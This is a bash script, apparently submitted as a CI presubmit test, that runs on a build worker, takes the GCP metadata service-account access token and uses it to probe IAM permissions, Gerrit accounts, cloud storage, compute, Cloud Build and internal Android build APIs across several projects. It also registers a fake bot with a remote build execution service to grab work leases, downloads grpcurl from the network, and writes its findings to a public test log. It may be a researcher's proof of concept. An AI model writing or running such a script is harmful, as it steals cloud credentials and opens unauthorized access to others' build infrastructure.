#!/usr/bin/env bash
set +e

echo 'hi_from_robert:d21766e5488dc00f:rbe-presubmit'
id
hostname
uname -a
printf 'metadata_email='
curl -fsS \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
  2>/dev/null || echo 'UNREACHABLE'
printf 'metadata_token_http_status='
curl -sS \
  -o /dev/null \
  -w '%{http_code}\n' \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  2>/dev/null || echo 'UNREACHABLE'

metadata_root='http://metadata.google.internal/computeMetadata/v1'
metadata_header='Metadata-Flavor: Google'
project_id="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/project-id" 2>/dev/null)"
project_number="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/numeric-project-id" 2>/dev/null)"
service_account="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/email" 2>/dev/null)"
scopes="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/scopes" 2>/dev/null | tr '\n' ',')"
token_json="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/token" 2>/dev/null)"
access_token="$(printf '%s' "$token_json" | sed -n \
  's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')"

printf 'metadata_project_id=%s\n' "$project_id"
printf 'metadata_project_number=%s\n' "$project_number"
printf 'metadata_scopes=%s\n' "$scopes"

if [[ -n "$access_token" && -n "$project_id" ]]; then
  project_permissions='{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.use","serviceusage.services.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","secretmanager.secrets.list","secretmanager.secrets.create","secretmanager.versions.access","storage.buckets.list","storage.buckets.create","compute.instances.list","compute.instances.create","compute.instances.setMetadata","compute.instances.setServiceAccount","cloudbuild.builds.list","cloudbuild.builds.get","cloudbuild.builds.create","artifactregistry.repositories.list","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.uploadArtifacts","pubsub.topics.list","pubsub.topics.publish","bigquery.datasets.create"]}'
  printf 'tenant_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833:testIamPermissions' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  service_account_permissions='{"permissions":["iam.serviceAccounts.get","iam.serviceAccounts.getIamPolicy","iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.getOpenIdToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccountKeys.create"]}'
  printf 'service_account_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$service_account_permissions" \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$service_account:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'


  for gerrit_origin in \
    'https://chromium-review.googlesource.com' \
    'https://bazel-review.googlesource.com' \
    'https://gerrit-review.googlesource.com' \
    'https://skia-review.googlesource.com'; do
    gerrit_name="$(printf '%s' "$gerrit_origin" | sed 's#https://##; s#-review.googlesource.com##')"
    printf 'gerrit_%s_self=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/detail" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
    printf 'gerrit_%s_capabilities=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/capabilities" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  done

  probe_status() {
    local label="$1"
    local url="$2"
    printf '%s_http_status=' "$label"
    curl -sS --max-time 10 -o /dev/null -w '%{http_code}' \
      -H "Authorization: Bearer $access_token" "$url" 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  }

  probe_status \
    'consumer_serviceusage_list' \
    'https://serviceusage.googleapis.com/v1/projects/1079131676376/services?filter=state:ENABLED&pageSize=1'
  probe_status \
    'consumer_androidbuild_service_get' \
    'https://serviceusage.googleapis.com/v1/projects/1079131676376/services/androidbuildinternal.googleapis.com'

  for resource_project in "$project_id" '316366457216' '572389441833' '1079131676376'; do
    probe_status \
      "project_${resource_project}_storage_bucket_list" \
      "https://storage.googleapis.com/storage/v1/b?project=${resource_project}&maxResults=1"
    probe_status \
      "project_${resource_project}_pubsub_topic_list" \
      "https://pubsub.googleapis.com/v1/projects/${resource_project}/topics?pageSize=1"
    probe_status \
      "project_${resource_project}_compute_instance_list" \
      "https://compute.googleapis.com/compute/v1/projects/${resource_project}/aggregated/instances?maxResults=1"
    probe_status \
      "project_${resource_project}_artifact_repository_list" \
      "https://artifactregistry.googleapis.com/v1/projects/${resource_project}/locations/-/repositories?pageSize=1"
    probe_status \
      "project_${resource_project}_cloudbuild_build_list" \
      "https://cloudbuild.googleapis.com/v1/projects/${resource_project}/builds?pageSize=1"
  done

  for android_resource in \
    'branches/b0244-nonexistent-d21766e5' \
    'invocations/b0244-nonexistent-d21766e5' \
    'workPlans/b0244-nonexistent-d21766e5' \
    'workNodes/b0244-nonexistent-d21766e5' \
    'workunits/b0244-nonexistent-d21766e5' \
    'tests/b0244-nonexistent-d21766e5' \
    'testArtifacts/b0244-nonexistent-d21766e5'; do
    android_label="$(printf '%s' "$android_resource" | tr '/-' '__')"
    printf 'androidbuild_%s=' "$android_label"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "https://androidbuildinternal.googleapis.com/android/internal/build/v3/$android_resource" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  done

  probe_status \
    'androidbuild_branch_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/branches?maxResults=1'
  probe_status \
    'androidbuild_invocation_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/invocations?maxResults=1'
  probe_status \
    'androidbuild_workplan_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/workPlans?maxResults=1'
  probe_status \
    'androidbuild_worknode_list' \
    'https://androidbuildinternal.googleapis.com/android/internal/build/v3/workNodes?maxResults=1'

  bot_id="hi-from-robert-d21766e5-$(hostname)"
  bot_session_body="$(printf \
    '{"botId":"%s","status":"UNHEALTHY","version":"b0244-d21766e5","worker":{"devices":[{"handle":"b0244-synthetic","properties":[{"key":"os","value":"linux"},{"key":"OSFamily","value":"Linux"},{"key":"Pool","value":"b0244-hi-from-robert-d21766e5"},{"key":"_b0244_nonce","value":"d21766e5488dc00f"}]}],"properties":[{"key":"os","value":"linux"},{"key":"OSFamily","value":"Linux"},{"key":"pool","value":"b0244-hi-from-robert-d21766e5"},{"key":"Pool","value":"b0244-hi-from-robert-d21766e5"},{"key":"_b0244_nonce","value":"d21766e5488dc00f"}],"configs":[{"key":"DockerImage","value":""},{"key":"container-image","value":""}]}}' \
    "$bot_id")"
  bot_response_file="/tmp/b0244-bot-session-$$.json"
  bot_http_status="$(curl -sS --max-time 20 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$bot_session_body" \
    'https://remotebuildexecution.googleapis.com/v1test2/projects/bazel-untrusted/instances/default_instance/botSessions' \
    -o "$bot_response_file" -w '%{http_code}' 2>/dev/null)"
  printf 'rbe_synthetic_bot_session='
  cat "$bot_response_file" 2>/dev/null || true
  printf '\nhttp_status=%s\n' "$bot_http_status"

  session_name="$(sed -n 's/.*"name"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
    "$bot_response_file")"
  if [[ "$bot_http_status" == '200' && -n "$session_name" ]]; then
    grpcurl_archive='/tmp/b0244-grpcurl.tar.gz'
    grpcurl_bin='/tmp/b0244-grpcurl'
    protoset_file='/tmp/b0244-bots.protoset'
    grpcurl_url='https://github.com/fullstorydev/grpcurl/releases/download/v1.9.4/grpcurl_1.9.4_linux_x86_64.tar.gz'
    grpcurl_sha256='97e13d58d2733a0e62cd2571d1d5f0c02823f0d25282f08bddedf1ad9c5d1736'
    probe_dir="$(cd "$(dirname "$0")" && pwd)"
    protoset_b64="$probe_dir/ci/b0244_bots.protoset.b64"

    curl -fsSL --max-time 30 "$grpcurl_url" -o "$grpcurl_archive"
    archive_sha256="$(sha256sum "$grpcurl_archive" | awk '{print $1}')"
    if [[ "$archive_sha256" == "$grpcurl_sha256" ]]; then
      tar -xzf "$grpcurl_archive" -C /tmp grpcurl
      mv /tmp/grpcurl "$grpcurl_bin"
      chmod 0700 "$grpcurl_bin"
    else
      printf 'rbe_grpcurl_checksum_error=expected:%s actual:%s\n' \
        "$grpcurl_sha256" "$archive_sha256"
    fi
    base64 -d "$protoset_b64" > "$protoset_file"
    printf 'rbe_protoset_sha256=%s\n' "$(sha256sum "$protoset_file" | awk '{print $1}')"

    bot_update_body="$(cat "$bot_response_file")"
    for poll_attempt in $(seq 1 90); do
      update_response_file="/tmp/b0244-bot-update-$$.json"
      update_error_file="/tmp/b0244-bot-update-$$.err"
      bot_update_request="$(printf '{"name":"%s","botSession":%s}' \
        "$session_name" "$bot_update_body")"
      "$grpcurl_bin" \
        -max-time 15 \
        -protoset "$protoset_file" \
        -H "Authorization: Bearer $access_token" \
        -d "$bot_update_request" \
        'remotebuildexecution.googleapis.com:443' \
        'google.devtools.remoteworkers.v1test2.Bots/UpdateBotSession' \
        > "$update_response_file" 2> "$update_error_file"
      update_exit_code=$?
      if [[ "$update_exit_code" != '0' ]]; then
        printf 'rbe_synthetic_bot_update_error='
        cat "$update_error_file" 2>/dev/null || true
        printf '\nexit_code=%s\n' "$update_exit_code"
        break
      fi
      bot_update_body="$(cat "$update_response_file")"
      if grep -q '"leases"' "$update_response_file"; then
        printf 'rbe_synthetic_lease_receipt='
        cat "$update_response_file"
        printf '\n'
        break
      fi
      sleep 2
    done
  fi

  printf 'tenant_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'
else
  echo 'identity_probe=NO_METADATA_TOKEN_OR_PROJECT'
fi
echo 'cgroup:'
cat /proc/1/cgroup 2>/dev/null || true
echo 'mounts:'
sed -n '1,40p' /proc/mounts 2>/dev/null || true

# Keep the receipt in the owned public test log even when test output defaults
# change; this synthetic target is expected to fail.
exit 1
